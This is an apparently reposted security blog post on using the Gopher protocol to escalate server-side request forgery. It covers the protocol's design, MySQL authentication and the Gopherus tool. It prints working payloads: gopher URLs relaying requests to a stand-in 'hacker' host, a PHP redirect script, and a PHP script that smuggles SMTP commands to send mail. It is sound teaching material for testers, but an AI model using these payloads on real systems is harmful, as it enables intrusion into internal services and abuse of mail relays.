# :globe_with_meridians: How Gopher works in escalating SSRFs

> **Original Source:** [How Gopher works in escalating SSRFs](https://infosecwriteups.com/how-gopher-works-in-escalating-ssrfs-ce6e5459b630)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# How Gopher works in escalating SSRFs


*Source: Google*


We all know about HTTP and HTTPS but how many of us have seen Gopher in wild? The one we use a lot in bypassing and escalating Server side request forgeries. Well, believe me or not, Gopher was conceived in 1991 as one of the Internet’s first data/file access protocols to run on top of a TCP/IP network. So, this blog is based on understandings and its uses in wild:)


Before we see how Gopher works, it is very important to understand what actually it is and how it was different from HTTP and HTTPS. Gopher is an application-layer protocol that provides the ability to extract and view Web documents stored on remote Web servers. When it came in existance, it was designed for distributing, searching, and retrieving documents in IP networks. Gopher was designed to function and to appear much like a mountable read-only global and whatever could be done with data files on a [CD-ROM](https://en.wikipedia.org/wiki/CD-ROM), could be done on Gopher as well. A Gopher system consists of a series of hierarchical hyperlinkable menus. The choice of menu items and titles is controlled by the administrator of the server. If you want to give a deep read on it, find it here:- [Gopher Protocol](https://en.wikipedia.org/wiki/Gopher_(protocol))*.*


Now, let’s see how it works. Gopher is similar to another Internet protocol, [File Transfer Protocol](https://en.wikipedia.org/wiki/File_Transfer_Protocol) (FTP), because it remotely accesses files over a TCP/IP internetwork such as the Internet. But while an FTP site exists on only one server and there can be many different FTP sites, there is really only one distributed Gopher file system. This is the main difference in it. The Gopher file system is a single collection of all Gopher servers in the world. Each Gopher server can act as the root of the hierarchical distributed file system. To access a file or document, a person using a Gopher client types the URL of an accessible Gopher server. Check the below image to understand it better:

*Source: Google*


It can realize the integrated transmission of multiple data packets, and then the gopher server bundles multiple data packets and sends them to the client. This is its menu response. For example, using a curl command of the gopher protocol can operate the mysql database or complete an attack on redis. The gopher protocol uses tcp for reliable connections. Information accessible by Gopher is stored as files on Gopher servers. It is organized in a hierarchical manner similar to the file system tree of a computer such as a Windows PC or UNIX workstation. Just as a file system consists of a top-level directory (or folder) that contains files and subdirectories (subfolders), Gopher servers present information as a top-level directory that contains resources such as files, and/or subdirectories containing additional resources. Resources on different servers can be linked together using by having them mentioned in each others’ resource hierarchies. It is also possible for “virtual” resources to be created that act as if they were files, such as programs that allow Gopher servers to be searched. The gopher url format is:


gopher://:/


It is a single character used to represent the type of url resource. In common security tests, it is found that no matter what this character is, it does not matter, as long as it has it. It can be understood as the predecessor or simplified version of the http protocol. Although it is very old, many libraries now support the gopher protocol and the gopher protocol is very powerful.


Now, we will see how Gopher can be handy in exploiting SSRFs. You must have seen SSRF payloads something like this:


gopher://127.0.0.1:1337/_SSRF%0ATest!


Using this protocol you can specify the ip, port and bytes you want the listener to send. Then, you can basically exploit a SSRF to communicate with any TCP server (obviously you need to know how to talk to the service first). The gopher protocol supports sending GET and POST requests: the get request packet and the post request packet can be intercepted first to form a request that conforms to the gopher protocol. The gopher protocol is the most powerful protocol in ssrf utilization.


Here is a take, If application is using Mysql database somehow, chances are likely higher you will end up exploiting a SSRF with the help of Gopher. Reason? MySQL database user authentication adopts the challenge/response mode. The server generates the challenge number and sends it to the client. The client encrypts the password with the challenge number and returns the corresponding result. Then the server checks whether the result is the same as the expected one, so as to complete the user authentication process. The encrypted password sent by the server is required for login, but when the database user password is empty, the encrypted password is also empty. The authentication package sent by client to server is relatively fixed. In this way, there is no need for interaction, and it can be sent through gopher protocol:)


## Get Manas Harsh’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Along with it, We can use gopher:// to communicate with the MySQL database. So, once you do some recon and realize you got a Mysql, you can bind Gopher with different payloads to listen on. Some examples are:


```
gopher://yourproxyserver:8080/_GET http://hacker:80>/x HTTP/1.1%0A%0Agopher://yourproxyserver:8080/_POST%20http://hacker:80/x%20HTTP/1.1%0ACookie:%20hacked%0A%0Ayou+are+hacked
```


```
<?phpheader(“Location: gopher://yoursite:1337/_SSRF%0ATest!”);?>
```


Query it on:


https://anysite.com/?q=http://hacker.com/redirect.php.


- You can also use it like this which will send a mail as well:


```
<?php
$commands = array(
'HELO victim.com',
'MAIL FROM: <admin@victim.com>',
'RCPT To: <sxcurity@oou.us>',
'DATA',
'Subject: @sxcurity!',
'Corben was here, woot woot!',
'.'
); $payload = implode('%0A', $commands); header('Location: gopher://0:25/_'.$payload);
?>
```


These were some examples available on internet and it all depends how you can utilize it. Anyways, Gopher could be really handy in exploiting SSRFs and after reading this article, if you see similar cases, you will likely want to exploit it further. Along comes an awesome tool on github which will help you to generate Gopher links and its super useful in such cases. I prefer manual tests, but you can always check what better suits you. Here is the link: [Gopherus](https://github.com/tarunkant/Gopherus).


I hope you got something new from this blog and since a couple of weeks I was thinking to write on it. If you liked this blog, share it and let people know something new. This will be it for this one and I have some more blog ideas in mind, working on it:) If you have any doubts or suggestions regarding this blog or any of mine, feel free to ping me on [Twitter](http://twitter.com/manasH4rsh). I really appreciate the inputs I get from you guys:) See ya sooner!


Stay safe, happy hacking:)


Adios ❤

---

*Originally published on [Medium](https://infosecwriteups.com/how-gopher-works-in-escalating-ssrfs-ce6e5459b630). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
